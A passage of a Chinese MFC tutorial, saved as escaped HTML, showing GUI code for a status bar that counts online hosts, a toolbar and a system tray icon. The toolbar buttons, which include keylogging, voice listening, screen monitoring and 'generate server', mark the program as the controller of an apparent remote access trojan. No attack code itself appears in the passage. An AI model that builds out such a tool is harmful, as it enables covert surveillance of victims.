data-num=\"9\"></td><td><pre>\t\tUINT<span class=\"token operator\">&amp;</span> nStyle<span class=\"token punctuation\">,</span>    <span class=\"token comment\">// 状态条的样式</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token keyword\">int</span><span class=\"token operator\">&amp;</span> cxWidth    <span class=\"token comment\">// 状态条的宽度</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>4. 写入代码创建状态条的代码:</p>\n<p>(1)  创建字符 ID 的数组</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">static</span> UINT indicators<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>IDR_STATUSBAR_STRING</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>(2) 添加 CreatStatusBar 函数并写入代码:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>m_wndStatusBar<span class=\"token punctuation\">.</span><span class=\"token function\">Create</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">!</span>m_wndStatusBar<span class=\"token punctuation\">.</span><span class=\"token function\">SetIndicators</span><span class=\"token punctuation\">(</span>indicators<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>indicators<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>                    <span class=\"token comment\">// 创建状态条并设置字符资源的 ID</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">TRACE0</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Failed to create status bar\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">return</span> <span class=\"token punctuation\">;</span>      <span class=\"token comment\">// fail to create</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>CRect rc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">::</span><span class=\"token function\">GetWindowRect</span><span class=\"token punctuation\">(</span>m_wndStatusBar<span class=\"token punctuation\">.</span>m_hWnd<span class=\"token punctuation\">,</span>rc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>             </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>m_wndStatusBar<span class=\"token punctuation\">.</span><span class=\"token function\">MoveWindow</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>                              <span class=\"token comment\">// 移动状态条到指定位置</span></pre></td></tr></table></figure><p>(3) 在 OnSize 中添加代码:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>m_wndStatusBar<span class=\"token punctuation\">.</span>m_hWnd<span class=\"token operator\">!=</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>    <span class=\"token comment\">// 当对话框大小改变时 状态条大小也随之改变</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>CRect rc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>rc<span class=\"token punctuation\">.</span>top<span class=\"token operator\">=</span>cy<span class=\"token operator\">-</span><span class=\"token number\">20</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>rc<span class=\"token punctuation\">.</span>left<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>rc<span class=\"token punctuation\">.</span>right<span class=\"token operator\">=</span>cx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>rc<span class=\"token punctuation\">.</span>bottom<span class=\"token operator\">=</span>cy<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>m_wndStatusBar<span class=\"token punctuation\">.</span><span class=\"token function\">MoveWindow</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>m_wndStatusBar<span class=\"token punctuation\">.</span><span class=\"token function\">SetPaneInfo</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> m_wndStatusBar<span class=\"token punctuation\">.</span><span class=\"token function\">GetItemID</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>SBPS_POPOUT<span class=\"token punctuation\">,</span> cx<span class=\"token operator\">-</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><strong>注意这里修改，关于 Message List 的大小设置框，使其底部留出状态栏的高度。</strong></p>\n<ol start=\"5\">\n<li>写入状态上显示文字的代码:<br />\n 在对话框的类中添加 protected 成员变量 int iCount<br />\n 并且在构造函数中把其初始化为 0。</li>\n</ol>\n<p>在 ShowMessage () 函数的最后加入以下代码：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>CString strStatusMsg<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>strMsg<span class=\"token punctuation\">.</span><span class=\"token function\">Find</span><span class=\"token punctuation\">(</span><span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"上线\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>         <span class=\"token comment\">// 处理上线还是下线消息</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tiCount<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>strMsg<span class=\"token punctuation\">.</span><span class=\"token function\">Find</span><span class=\"token punctuation\">(</span><span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"下线\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tiCount<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>strMsg<span class=\"token punctuation\">.</span><span class=\"token function\">Find</span><span class=\"token punctuation\">(</span><span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"断开\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tiCount<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>iCount <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>iCount <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token operator\">?</span> <span class=\"token number\">0</span> <span class=\"token operator\">:</span> iCount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>         <span class=\"token comment\">// 防止 iCount 有 - 1 的情况</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>strStatusMsg<span class=\"token punctuation\">.</span><span class=\"token function\">Format</span><span class=\"token punctuation\">(</span><span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"连接：%d\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> iCount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>m_wndStatusBar<span class=\"token punctuation\">.</span><span class=\"token function\">SetPaneText</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> strStatusMsg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 在状态条上显示文字</span></pre></td></tr></table></figure><p>6. 列表中添加条目时产生日志:</p>\n<p>记得在 Addlist 中添加  <code>ShowMessage(true, strIP + _T(&quot;主机上线&quot;));</code></p>\n<p>截图如下：</p>\n<p><img data-src=\"image016.png\" alt=\"\" /></p>\n<h2 id=\"为对话框添加工具条\"><a class=\"anchor\" href=\"#为对话框添加工具条\">#</a> 为对话框添加工具条</h2>\n<ol>\n<li>创建工具条资源<br />\n ID:  IDR_TOOLBAR_MAIN</li>\n</ol>\n<p>共 12 个工具条  9+3。 创建 12 个方块就行了</p>\n<ol start=\"2\">\n<li>添加 BMP 资源:<br />\nID:  IDB_BITMAP_MAIN</li>\n</ol>\n<p>这里自己 DIY 了每一个位图，然后在<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudG9wdGFsLmNvbS9kZXZlbG9wZXJzL2Nzcy9zcHJpdGUtZ2VuZXJhdG9yLw==\"> https://www.toptal.com/developers/css/sprite-generator/</span> 生成精灵图。</p>\n<ol start=\"3\">\n<li>\n<p>复制 TrueColorToolBar 文件，添加 CTrueColorToolBar 类.</p>\n</li>\n<li>\n<p>在对话框的头文件中添加:</p>\n</li>\n</ol>\n<p>#include &quot;TrueColorToolBar.h&quot;</p>\n<ol start=\"5\">\n<li>并且在对话框的类中声明 protected 成员变量:</li>\n</ol>\n<p><code>CTrueColorToolBar m_ToolBar; </code></p>\n<ol start=\"6\">\n<li>\n<p>添加 CreateToolBar () 函数</p>\n</li>\n<li>\n<p>分析 CTrueColorToolBar 类:<br />\n 继承 CToolBar</p>\n</li>\n<li>\n<p>查看 MSDN  CToolBar 类:</p>\n</li>\n<li>\n<p>CreateToolBar () 函数中写入代码:</p>\n</li>\n</ol>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>m_ToolBar<span class=\"token punctuation\">.</span><span class=\"token function\">CreateEx</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> TBSTYLE_FLAT<span class=\"token punctuation\">,</span> WS_CHILD <span class=\"token operator\">|</span> WS_VISIBLE <span class=\"token operator\">|</span> CBRS_TOP</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t\t<span class=\"token operator\">|</span> CBRS_GRIPPER <span class=\"token operator\">|</span> CBRS_TOOLTIPS <span class=\"token operator\">|</span> CBRS_FLYBY <span class=\"token operator\">|</span> CBRS_SIZE_DYNAMIC<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token operator\">!</span>m_ToolBar<span class=\"token punctuation\">.</span><span class=\"token function\">LoadToolBar</span><span class=\"token punctuation\">(</span>IDR_TOOLBAR_MAIN<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token function\">TRACE0</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Failed to create toolbar\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>      <span class=\"token comment\">// fail to create</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tm_ToolBar<span class=\"token punctuation\">.</span><span class=\"token function\">ModifyStyle</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> TBSTYLE_FLAT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">//Fix for WinXP</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tm_ToolBar<span class=\"token punctuation\">.</span><span class=\"token function\">LoadTrueColorToolBar</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token number\">48</span><span class=\"token punctuation\">,</span>    <span class=\"token comment\">// 加载真彩工具条</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\tIDB_BITMAP_MAIN<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\tIDB_BITMAP_MAIN<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\tIDB_BITMAP_MAIN</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tRECT rt<span class=\"token punctuation\">,</span> rtMain<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token function\">GetWindowRect</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>rtMain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\trt<span class=\"token punctuation\">.</span>left <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\trt<span class=\"token punctuation\">.</span>top <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\trt<span class=\"token punctuation\">.</span>bottom <span class=\"token operator\">=</span> <span class=\"token number\">80</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\trt<span class=\"token punctuation\">.</span>right <span class=\"token operator\">=</span> rtMain<span class=\"token punctuation\">.</span>right <span class=\"token operator\">-</span> rtMain<span class=\"token punctuation\">.</span>left <span class=\"token operator\">+</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\tm_ToolBar<span class=\"token punctuation\">.</span><span class=\"token function\">MoveWindow</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>rt<span class=\"token punctuation\">,</span> TRUE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\tm_ToolBar<span class=\"token punctuation\">.</span><span class=\"token function\">SetButtonText</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"终端管理\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\tm_ToolBar<span class=\"token punctuation\">.</span><span class=\"token function\">SetButtonText</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"进程管理\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\tm_ToolBar<span class=\"token punctuation\">.</span><span class=\"token function\">SetButtonText</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"窗口管理\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\tm_ToolBar<span class=\"token punctuation\">.</span><span class=\"token function\">SetButtonText</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"屏幕监控\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\tm_ToolBar<span class=\"token punctuation\">.</span><span class=\"token function\">SetButtonText</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"文件管理\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\tm_ToolBar<span class=\"token punctuation\">.</span><span class=\"token function\">SetButtonText</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"语音监听\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\tm_ToolBar<span class=\"token punctuation\">.</span><span class=\"token function\">SetButtonText</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"键盘记录\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\tm_ToolBar<span class=\"token punctuation\">.</span><span class=\"token function\">SetButtonText</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"服务管理\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\tm_ToolBar<span class=\"token punctuation\">.</span><span class=\"token function\">SetButtonText</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"注册表管理\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\tm_ToolBar<span class=\"token punctuation\">.</span><span class=\"token function\">SetButtonText</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"参数设置\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\tm_ToolBar<span class=\"token punctuation\">.</span><span class=\"token function\">SetButtonText</span><span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"生成服务端\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\tm_ToolBar<span class=\"token punctuation\">.</span><span class=\"token function\">SetButtonText</span><span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"帮助\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t<span class=\"token function\">RepositionBars</span><span class=\"token punctuation\">(</span>AFX_IDW_CONTROLBAR_FIRST<span class=\"token punctuation\">,</span> AFX_IDW_CONTROLBAR_LAST<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ol start=\"10\">\n<li>OnSize 中添加代码:</li>\n</ol>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>m_ToolBar<span class=\"token punctuation\">.</span>m_hWnd<span class=\"token operator\">!=</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span>              <span class=\"token comment\">// 工具条</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>CRect rc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>rc<span class=\"token punctuation\">.</span>top<span class=\"token operator\">=</span>rc<span class=\"token punctuation\">.</span>left<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>rc<span class=\"token punctuation\">.</span>right<span class=\"token operator\">=</span>cx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>rc<span class=\"token punctuation\">.</span>bottom<span class=\"token operator\">=</span><span class=\"token number\">80</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>m_ToolBar<span class=\"token punctuation\">.</span><span class=\"token function\">MoveWindow</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>     <span class=\"token comment\">// 设置工具条大小位置</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><ol start=\"11\">\n<li>\n<p>Oninitdialog 中添加 CreateToolBar</p>\n</li>\n<li>\n<p>vs 系列中工具条不能添加消息响应，然后应该给工具条添加已经设置过的菜单的消息，省去好多麻烦。</p>\n</li>\n</ol>\n<p>截图：</p>\n<p><img data-src=\"image017.png\" alt=\"\" /></p>\n<h2 id=\"为程序添加系统托盘\"><a class=\"anchor\" href=\"#为程序添加系统托盘\">#</a> 为程序添加系统托盘</h2>\n<ol>\n<li>创建菜单资源</li>\n</ol>\n<p>ID:  IDR_MENU_NOTIFY</p>\n<p>添加子菜单并设置其 ID<br />\n 显示  IDM_NOTIFY_SHOW<br />\n 退出  IDM_NOTIFY_CLOSE</p>\n<p><img data-src=\"image018.png\" alt=\"\" /></p>\n<ol start=\"2\">\n<li>认识一个 API   <code>Shell_NotifyIcon</code></li>\n</ol>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 向系统托盘中加入图标</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>BOOL <span class=\"token function\">Shell_NotifyIcon</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tDWORD dwMessage<span class=\"token punctuation\">,</span>         <span class=\"token comment\">// 状态           </span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tPNOTIFYICONDATA lpdata   <span class=\"token comment\">// 含有图标  消息响应 的一个结构体</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ol start=\"3\">\n<li>认识  <code>NOTIFYICONDATA</code>  结构体:</li>\n</ol>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_NOTIFYICONDATA</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    DWORD cbSize<span class=\"token punctuation\">;</span>       <span class=\"token comment\">// 结构体自身大小</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    HWND hWnd<span class=\"token punctuation\">;</span>          <span class=\"token comment\">// 托盘的父窗口  托盘发出的消息由哪一个窗口响应</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    UINT uID<span class=\"token punctuation\">;</span>           <span class=\"token comment\">// 显示图标的 ID</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    UINT uFlags<span class=\"token punctuation\">;</span>         <span class=\"token comment\">// 托盘的状态 (如有图标，有气泡提示，有消息响应等)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    UINT uCallbackMessage<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 托盘事件的消息响应函数</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    HICON hIcon<span class=\"token punctuation\">;</span>            <span class=\"token comment\">// 图标的变量</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    TCHAR szTip<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 气泡的显示文字</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    DWORD dwState<span class=\"token punctuation\">;</span>          <span class=\"token comment\">// 图标的显示状态</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    DWORD dwStateMask<span class=\"token punctuation\">;</span>      <span class=\"token comment\">// 图标的显示状态</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    TCHAR szInfo<span class=\"token punctuation\">[</span><span class=\"token number\">256</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>      <span class=\"token comment\">// 气泡的显示文字  (可以忽略)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">union</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        UINT uTimeout<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        UINT uVersion<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    TCHAR szInfoTitle<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    DWORD dwInfoFlags<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    GUID guidItem<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    HICON hBalloonIcon<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span> NOTIFYICONDATA<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>PNOTIFYICONDATA<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ol start=\"4\">\n<li>在  <code>OnInitDialog</code>  函数中写入加入系统脱盘的代码:</li>\n</ol>\n<p>需要在对话框的类中添加 protected 成员  <code>NOTIFYICONDATA nid</code> <br />\n 这里我添加了一个函数  <code>CreateSystemTray()</code></p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// TODO: 在此处添加实现代码.</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>nid<span class=\"token punctuation\">.</span>cbSize <span class=\"token operator\">=</span> <span class=\"token 